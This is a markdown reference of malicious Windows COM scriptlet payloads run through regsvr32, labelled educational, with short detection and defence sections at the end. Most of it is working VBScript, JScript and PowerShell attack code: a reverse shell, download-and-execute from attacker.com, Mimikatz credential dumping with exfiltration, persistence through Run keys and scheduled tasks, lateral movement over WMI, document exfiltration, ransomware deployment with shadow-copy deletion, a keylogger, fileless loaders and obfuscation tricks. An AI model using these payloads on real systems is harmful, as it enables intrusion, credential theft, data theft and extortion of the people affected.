# Real-World Malicious Scriptlet Payloads

## ⚠️ EDUCATIONAL REFERENCE ONLY - DO NOT USE MALICIOUSLY ⚠️

This document shows what attackers actually do when weaponizing COM scriptlets.

---

## What Attackers Replace

### Benign Code (Testing):
```vbscript
' Benign for testing
objShell.Run "calc.exe", 1, False
```

### Malicious Code (Real Attack):
```vbscript
' Malicious payload
objShell.Run "powershell.exe -w hidden -enc <base64_encoded_payload>", 0, True
```

---

## Common Malicious Payloads

### 1. **PowerShell Reverse Shell**

#### VBScript Version:
```vbscript
Set objShell = CreateObject("WScript.Shell")

' Download and execute malware
cmd = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command " & _
      "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',4444);" & _
      "$stream = $client.GetStream();" & _
      "[byte[]]$bytes = 0..65535|%{0};" & _
      "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;" & _
      "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);" & _
      "$sendback = (iex $data 2>&1 | Out-String );" & _
      "$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';" & _
      "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);" & _
      "$stream.Write($sendbyte,0,$sendbyte.Length);" & _
      "$stream.Flush()};" & _
      "$client.Close()"

objShell.Run cmd, 0, False
```

#### JScript Version:
```javascript
var shell = new ActiveXObject("WScript.Shell");

var cmd = "powershell.exe -w hidden -nop -c " +
          "\"$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',4444);\" " +
          "\"$stream = $client.GetStream();\" " +
          "\"[byte[]]$bytes = 0..65535|%{0};\" " +
          "\"while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {\" " +
          "\"$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);\" " +
          "\"$sendback = (iex $data 2>&1 | Out-String);\" " +
          "\"$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';\" " +
          "\"$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);\" " +
          "\"$stream.Write($sendbyte,0,$sendbyte.Length);\" " +
          "\"$stream.Flush()};\" " +
          "\"$client.Close()\"";

shell.Run(cmd, 0, false);
```

### 2. **Download and Execute**

#### VBScript:
```vbscript
Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Download malware
tempPath = objShell.ExpandEnvironmentStrings("%TEMP%")
malwareURL = "http://attacker.com/payload.exe"
savePath = tempPath & "\update.exe"

' Method 1: PowerShell download
cmd = "powershell.exe -w hidden -c ""(New-Object System.Net.WebClient).DownloadFile('" & malwareURL & "','" & savePath & "')"""
objShell.Run cmd, 0, True

' Wait for download
WScript.Sleep 3000

' Execute downloaded malware
objShell.Run """" & savePath & """", 0, False
```

#### JScript:
```javascript
var shell = new ActiveXObject("WScript.Shell");
var fso = new ActiveXObject("Scripting.FileSystemObject");

// Download and execute
var tempPath = shell.ExpandEnvironmentStrings("%TEMP%");
var malwareURL = "http://attacker.com/payload.exe";
var savePath = tempPath + "\\update.exe";

// Download
var cmd = "powershell.exe -w hidden -nop -c \"" +
          "(New-Object System.Net.WebClient).DownloadFile('" + 
          malwareURL + "','" + savePath + "')\"";
shell.Run(cmd, 0, true);

// Execute after delay
WScript.Sleep(3000);
shell.Run('"' + savePath + '"', 0, false);
```

### 3. **Credential Harvesting**

```vbscript
Set objShell = CreateObject("WScript.Shell")

' Dump credentials using Mimikatz
cmd = "powershell.exe -w hidden -c """ & _
      "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/Invoke-Mimikatz.ps1'); " & _
      "Invoke-Mimikatz -DumpCreds -ComputerName localhost | Out-File C:\temp\creds.txt" & _
      """"
      
objShell.Run cmd, 0, False

' Exfiltrate credentials
WScript.Sleep 5000
exfilCmd = "powershell.exe -w hidden -c ""Invoke-RestMethod -Uri 'http://attacker.com/upload' -Method POST -InFile C:\temp\creds.txt"""
objShell.Run exfilCmd, 0, False
```

### 4. **Persistence Mechanism**

```vbscript
Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Copy scriptlet to startup folder
startupPath = objShell.SpecialFolders("Startup")
scriptPath = WScript.ScriptFullName

' Copy self to startup
If objFSO.FileExists(scriptPath) Then
    objFSO.CopyFile scriptPath, startupPath & "\svchost.sct", True
End If

' Create scheduled task for persistence
cmd = "schtasks /create /tn ""WindowsUpdate"" /tr ""regsvr32.exe /s /u /i:" & _
      scriptPath & " scrobj.dll"" /sc onlogon /ru System /f"
objShell.Run cmd, 0, True

' Add registry run key
regPath = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
objShell.RegWrite regPath & "\SecurityUpdate", _
                 "regsvr32.exe /s /u /i:""" & scriptPath & """ scrobj.dll", _
                 "REG_SZ"
```

### 5. **Lateral Movement**

```vbscript
Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objNetwork = CreateObject("WScript.Network")

' Get current script path
scriptPath = WScript.ScriptFullName

' Target computers on network
targets = Array("192.168.1.100", "192.168.1.101", "192.168.1.102")

For Each target In targets
    ' Copy scriptlet to remote system
    remotePath = "\\" & target & "\C$\Windows\Temp\update.sct"
    
    On Error Resume Next
    objFSO.CopyFile scriptPath, remotePath, True
    
    If Err.Number = 0 Then
        ' Execute on remote system using PSExec or WMI
        cmd = "wmic /node:" & target & " process call create """ & _
              "regsvr32.exe /s /u /i:C:\Windows\Temp\update.sct scrobj.dll"""
        objShell.Run cmd, 0, True
    End If
    On Error Goto 0
Next
```

### 6. **Data Exfiltration**

```vbscript
Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Collect sensitive files
userProfile = objShell.ExpandEnvironmentStrings("%USERPROFILE%")
tempZip = objShell.ExpandEnvironmentStrings("%TEMP%") & "\data.zip"

' PowerShell script to zip files
psScript = "powershell.exe -w hidden -c """ & _
           "$files = Get-ChildItem -Path '" & userProfile & "\Documents' -Include *.pdf,*.docx,*.xlsx -Recurse;" & _
           "Compress-Archive -Path $files -DestinationPath '" & tempZip & "' -Force;" & _
           "Invoke-RestMethod -Uri 'http://attacker.com/exfil' -Method POST -InFile '" & tempZip & "';" & _
           "Remove-Item '" & tempZip & "' -Force" & _
           """"

objShell.Run psScript, 0, False
```

### 7. **Ransomware Deployment**

```vbscript
Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Download ransomware payload
tempPath = objShell.ExpandEnvironmentStrings("%TEMP%")
ransomwareURL = "http://attacker.com/crypto.exe"
ransomwarePath = tempPath & "\svchost.exe"

' Download
cmd = "powershell.exe -w hidden -c ""(New-Object System.Net.WebClient).DownloadFile('" & ransomwareURL & "','" & ransomwarePath & "')"""
objShell.Run cmd, 0, True

WScript.Sleep 5000

' Execute ransomware
objShell.Run """" & ransomwarePath & """", 0, False

' Delete shadow copies to prevent recovery
objShell.Run "vssadmin.exe Delete Shadows /All /Quiet", 0, True
objShell.Run "wmic.exe shadowcopy delete", 0, True
```

### 8. **Encoded PowerShell Payload**

```vbscript
Set objShell = CreateObject("WScript.Shell")

' Attackers often use base64 encoding to evade detection
encodedPayload = "JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQAwAC4AMQAwACIALAA0ADQANAA0ACkA"

cmd = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -EncodedCommand " & encodedPayload
objShell.Run cmd, 0, False
```

### 9. **Fileless Malware**

```vbscript
Set objShell = CreateObject("WScript.Shell")

' Inject malicious code directly into memory without touching disk
cmd = "powershell.exe -w hidden -nop -c """ & _
      "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1');" & _
      """"

objShell.Run cmd, 0, False
```

### 10. **Keylogger**

```vbscript
Set objShell = CreateObject("WScript.Shell")

' Deploy keylogger
psScript = "powershell.exe -w hidden -c """ & _
           "$code = (New-Object Net.WebClient).DownloadString('http://attacker.com/keylogger.ps1');" & _
           "IEX $code;" & _
           "Start-Keylogger -OutputPath $env:TEMP\log.txt -Server 'http://attacker.com/logs'" & _
           """"

objShell.Run psScript, 0, False
```

---

## Obfuscation Techniques

### 1. String Obfuscation
```vbscript
' Instead of obvious commands:
objShell.Run "powershell.exe"

' Attackers use:
p = "pow"
e = "ershel"
l = "l.exe"
objShell.Run p & e & l
```

### 2. Variable Name Obfuscation
```vbscript
' Instead of descriptive names:
Set objShell = CreateObject("WScript.Shell")

' Use random names:
Set a = CreateObject("WScript.Shell")
Set b = CreateObject("Scripting.FileSystemObject")
```

### 3. Function Splitting
```vbscript
Function GetS()
    GetS = "WScript."
End Function

Function GetSh()
    GetSh = "Shell"
End Function

Set obj = CreateObject(GetS() & GetSh())
```

---

## Real-World Attack Flow

1. **Initial Access**: Phishing email with .sct attachment
2. **Execution**: User opens file or clicks malicious link
   ```
   regsvr32.exe /s /u /i:http://attacker.com/payload.sct scrobj.dll
   ```
3. **Payload Delivery**: Unregistration block executes
4. **Persistence**: Creates scheduled tasks, registry keys
5. **Credential Access**: Dumps passwords, tokens
6. **Lateral Movement**: Spreads to other systems
7. **Data Exfiltration**: Steals sensitive information
8. **Impact**: Deploys ransomware or wiper

---

## Defense Detection Points

### Critical Indicators:

1. **Process Execution**
   - `regsvr32.exe` with network activity
   - `regsvr32.exe` spawning `powershell.exe`
   - `regsvr32.exe` with `/i:http` or `/i:https`

2. **Network Indicators**
   - Outbound connections from regsvr32.exe
   - DNS queries from regsvr32.exe
   - HTTP/HTTPS downloads by regsvr32.exe

3. **File System**
   - .sct files in temp directories
   - .sct files in startup folders
   - Unusual file downloads to %TEMP%

4. **Registry**
   - New Run keys created by regsvr32.exe
   - Scheduled tasks created during script execution

---

## How to Test Safely

1. **Use isolated lab environment** (VM with no network)
2. **Replace attacker IP** with localhost or dummy IP
3. **Replace malware URLs** with non-existent domains
4. **Monitor with EDR/AV** to test detection
5. **Document all IOCs** (Indicators of Compromise)

---

## Defensive Recommendations

1. **Block regsvr32.exe** network access via firewall
2. **Monitor parent-child** process relationships
3. **Implement AppLocker** to control script execution
4. **Enable PowerShell logging** (Module, Script Block, Transcription)
5. **Deploy EDR** with behavioral detection
6. **User awareness training** on .sct files

---

**Remember**: These examples are for defensive security research and education only. Unauthorized use is illegal and unethical.

**MITRE ATT&CK Reference**: T1218.010 - Signed Binary Proxy Execution: Regsvr32
